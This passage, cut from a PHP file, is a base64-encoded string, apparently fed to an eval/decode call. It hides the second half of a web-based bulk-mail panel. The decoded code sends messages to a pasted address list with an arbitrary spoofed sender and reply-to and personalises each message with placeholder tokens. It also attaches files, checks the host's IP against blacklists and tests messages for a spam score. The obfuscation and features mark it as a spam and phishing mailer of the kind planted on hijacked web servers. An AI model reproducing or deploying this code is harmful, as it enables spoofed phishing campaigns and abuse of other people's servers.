V0RWxlbWVudEJ5SWQoXCdmb3JtXCcpLnN1Ym1pdCgpOyByZXR1cm4gZmFsc2U7Ij5jaGVjayBTcGFtQXNzYXNzaW4gU2NvcmU8L2E+CiAgIAogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxicj4KICAgICAgICA8bGFiZWwgZm9yPSJ3ZWxsIj5JbnN0cnVjdGlvbjwvbGFiZWw+CiAgICAgICAgPGRpdiBpZD0id2VsbCIgY2xhc3M9IndlbGwgd2VsbCI+CiAgICAgICAgICAgIDxoND5TZXJ2ZXIgSW5mb3JtYXRpb248L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+U2VydmVyIElQIEFkZHJlc3MgOiA8Yj4nLiRfU0VSVkVSWydTRVJWRVJfQUREUiddLicgPC9iPiA8YSBocmVmPSI/Y2hlY2tfaXA9Jy4kX1NFUlZFUlsnU0VSVkVSX0FERFInXS4nIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImxhYmVsIGxhYmVsLXByaW1hcnkiPkNoZWNrIEJsYWNrbGlzdCA8aSBjbGFzcz0iZ2x5cGhpY29uIGdseXBoaWNvbi1zZWFyY2giPjwvaT48L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT5QSFAgVmVyc2lvbiA6IDxiPicucGhwdmVyc2lvbigpLic8L2I+PC9saT4KICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPGg0PkhFTFA8L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbC1dIDogPGI+UmVjaXZlciBFbWFpbDwvYj4gKGVtYWlsdXNlckBlbWFpbGRvbWFpbi5jb20pPC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbHVzZXItXSA6IDxiPkVtYWlsIFVzZXI8L2I+IChlbWFpbHVzZXIpIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPlstZW1haWxkb21haW4tXSA6IDxiPkVtYWlsIFVzZXI8L2I+IChlbWFpbGRvbWFpbi5jb20pIDwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPGxpPlstdGltZS1dIDogPGI+RGF0ZSBhbmQgVGltZTwvYj4gKCcuZGF0ZSgibS9kL1kgaDppOnMgYSIsIHRpbWUoKSkuJyk8L2xpPgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21zdHJpbmctXSA6IDxiPlJhbmRvbSBzdHJpbmcgKDAtOSxhLXopPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21udW1iZXItXSA6IDxiPlJhbmRvbSBudW1iZXIgKDAtOSkgPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21sZXR0ZXJzLV0gOiA8Yj5SYW5kb20gTGV0dGVycyhhLXopIDwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbWQ1LV0gOiA8Yj5SYW5kb20gTUQ1IDwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8aDQ+ZXhhbXBsZTwvaDQ+CiAgICAgICAgICAgIFJlY2VpdmVyIEVtYWlsID0gPGI+dXNlckBkb21haW4uY29tPC9iPjxicj4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPmhlbGxvIDxiPlstZW1haWx1c2VyLV08L2I+ID0gaGVsbG8gPGI+dXNlcjwvYj48L2xpPgogICAgICAgICAgICAgICAgPGxpPnlvdXIgZG9tYWluIGlzIDxiPlstZW1haWxkb21haW4tXTwvYj4gPSBZb3VyIERvbWFpbiBpcyA8Yj5kb21haW4uY29tPC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8bGk+eW91ciBjb2RlIGlzICA8Yj5bLXJhbmRvbW1kNS1dPC9iPiA9IHlvdXIgY29kZSBpcyA8Yj5lMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZTwvYj48L2xpPgogICAgICAgICAgICA8L3VsPgoKICAgICAgICAgICAgPGg2PmJ5IDxiPjxhIGhyZWY9Imh0dHA6Ly8nLiRsZWFmWyd3ZWJzaXRlJ10uJyI+Jy4kbGVhZlsnd2Vic2l0ZSddLic8L2E+PC9iPjwvaDY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4nOyAgCmlmKCRfUE9TVFsnYWN0aW9uJ109PSJzZW5kIil7CiAgICBwcmludCAnICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+JzsKICAgICRtYWlsbGlzdD1leHBsb2RlKCJcclxuIiwgJGVtYWlsTGlzdCk7CiAgICAkbj1jb3VudCgkbWFpbGxpc3QpOwogICAgJHggPTE7CiAgICBmb3JlYWNoICgkbWFpbGxpc3QgYXMgJGVtYWlsICkgewogICAgICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb2wtbGctMSI+WycuJHguJy8nLiRuLiddPC9kaXY+PGRpdiBjbGFzcz0iY29sLWxnLTQiPicuJGVtYWlsLic8L2Rpdj4nOwogICAgICAgIGlmKCFsZWFmTWFpbENoZWNrKCRlbWFpbCkpIHsKICAgICAgICAgICAgcHJpbnQgJzxkaXYgY2xhc3M9ImNvbC1sZy02Ij48c3BhbiBjbGFzcz0ibGFiZWwgbGFiZWwtZGVmYXVsdCI+SW5jb3JyZWN0IEVtYWlsPC9zcGFuPjwvZGl2Pic7CiAgICAgICAgICAgIHByaW50ICI8YnI+XHJcbiI7CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkbWFpbCA9IG5ldyBQSFBNYWlsZXI7CiAgICAgICAgICAgICRtYWlsLT5zZXRGcm9tKGxlYWZDbGVhcigkc2VuZGVyRW1haWwsJGVtYWlsKSxsZWFmQ2xlYXIoJHNlbmRlck5hbWUsJGVtYWlsKSk7CiAgICAgICAgICAgICRtYWlsLT5hZGRSZXBseVRvKGxlYWZDbGVhcigkcmVwbHlUbywkZW1haWwpKTsKICAgICAgICAgICAgJG1haWwtPmFkZEFkZHJlc3MoJGVtYWlsKTsKICAgICAgICAgICAgJG1haWwtPlN1YmplY3QgPSBsZWFmQ2xlYXIoJHN1YmplY3QsJGVtYWlsKTsKICAgICAgICAgICAgJG1haWwtPkJvZHkgPSAgbGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCk7CiAgICAgICAgICAgIGlmKCRtZXNzYWdlVHlwZT09MSl7CiAgICAgICAgICAgICAgICAkbWFpbC0+SXNIVE1MKHRydWUpOwogICAgICAgICAgICAgICAgJG1haWwtPkFsdEJvZHkgPXN0cmlwX3RhZ3MobGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCkpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgJG1haWwtPklzSFRNTChmYWxzZSk7CiAgICAgICAgICAgICRtYWlsLT5DaGFyU2V0ID0gJGNoYXJzZXQ7CiAgICAgICAgICAgICRtYWlsLT5FbmNvZGluZyA9ICRlbmNvZGluZzsKICAgICAgICAgICAgZm9yKCRpPTA7ICRpPGNvdW50KCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsnbmFtZSddKTsgJGkrKykgewogICAgICAgICAgICAgICAgaWYgKCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsndG1wX25hbWUnXVskaV0gIT0gIiIpewogICAgICAgICAgICAgICAgICAgICRtYWlsLT5BZGRBdHRhY2htZW50KCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsndG1wX25hbWUnXVskaV0sJF9GSUxFU1snYXR0YWNobWVudCddWyduYW1lJ11bJGldKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICghJG1haWwtPnNlbmQoKSkgewogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1kZWZhdWx0Ij4nLmh0bWxzcGVjaWFsY2hhcnMoJG1haWwtPkVycm9ySW5mbykuJzwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1zdWNjZXNzIj5Pazwvc3Bhbj48L2Rpdj4nOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHByaW50ICI8YnI+XHJcbiI7CiAgICAgICAgfQogICAgICAgICR4Kys7CiAgICAgICAgZm9yKCRrID0gMDsgJGsgPCA0MDAwMDsgJGsrKykge2VjaG8gJyAnO30KICAgIH0KCn0KZWxzZWlmKCRfUE9TVFsnYWN0aW9uJ109PSJzY29yZSIpewogICAgJG1haWwgPSBuZXcgUEhQTWFpbGVyOwogICAgJG1haWwtPnNldEZyb20obGVhZkNsZWFyKCRzZW5kZXJFbWFpbCwkZW1haWwpLGxlYWZDbGVhcigkc2VuZGVyTmFtZSwkZW1haWwpKTsKICAgICRtYWlsLT5hZGRSZXBseVRvKGxlYWZDbGVhcigkcmVwbHlUbywkZW1haWwpKTsKICAgICRtYWlsLT5hZGRBZGRyZXNzKCJ1c2VybmFtZUBkb21haW4uY29tIik7CiAgICAkbWFpbC0+U3ViamVjdCA9IGxlYWZDbGVhcigkc3ViamVjdCwkZW1haWwpOwogICAgJG1haWwtPkJvZHkgPSAgbGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCk7CiAgICBpZigkbWVzc2FnZVR5cGU9PTEpewogICAgICAgICRtYWlsLT5Jc0hUTUwodHJ1ZSk7CiAgICAgICAgJG1haWwtPkFsdEJvZHkgPXN0cmlwX3RhZ3MobGVhZkNsZWFyKCRtZXNzYWdlTGV0dGVyLCRlbWFpbCkpOwogICAgfQogICAgZWxzZSAkbWFpbC0+SXNIVE1MKGZhbHNlKTsKICAgICRtYWlsLT5DaGFyU2V0ID0gJGNoYXJzZXQ7CiAgICAkbWFpbC0+RW5jb2RpbmcgPSAkZW5jb2Rpbmc7CiAgICAkbWFpbC0+cHJlU2VuZCgpOwogICAgJG1lc3NhZ2VIZWFkZXJzPSRtYWlsLT5nZXRTZW50TUlNRU1lc3NhZ2UoKTsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICdodHRwOi8vc3BhbWNoZWNrLnBvc3RtYXJrYXBwLmNvbS9maWx0ZXInKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCBodHRwX2J1aWxkX3F1ZXJ5KGFycmF5KCdlbWFpbCcgPT4gJG1lc3NhZ2VIZWFkZXJzLCdvcHRpb25zJz0+J2xvbmcnKSkpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCAxNSk7CiAgICAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGNoKTsKICAgICRyZXNwb25zZSA9IGpzb25fZGVjb2RlKCRyZXNwb25zZSk7CiAgICBwcmludCAnICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+JzsKICAgIGlmICgkcmVzcG9uc2UtPnN1Y2Nlc3MgPT0gVFJVRSApewogICAgICAgICRzY29yZSA9ICRyZXNwb25zZS0+c2NvcmU7CiAgICAgICAgaWYgKCRzY29yZSA+IDUgKSAkY2xhc3M9ImRhbmdlciI7CiAgICAgICAgZWxzZSAkY2xhc3M9InN1Y2Nlc3MiOwogICAgICAgICAgICBwcmludCAnPGRpdiBjbGFzcz0idGV4dC0nLiRjbGFzcy4nIj5Zb3VyIFNwYW1Bc3Nhc3NpbiBzY29yZSBpcyAnLiRzY29yZS4nICA8L2Rpdj4KPGRpdj5GdWxsIFJlcG9ydCA6IDxwcmU+Jy4kcmVzcG9uc2UtPnJlcG9ydC4nPC9wcmU+PC9kaXY+JzsKcHJpbnQgJyAgICA8L2Rpdj4nOwogICAgfQp9CnByaW50ICc8L2JvZHk+JzsgPz4KCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CgkKCS5sb2dvIGltZyB7CgkJYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKZmxvYXQ6IGNlbnRlcjsKaGVpZ2h0OiA1MHB4OwoJfQo8L3N0eWxlPg=="));
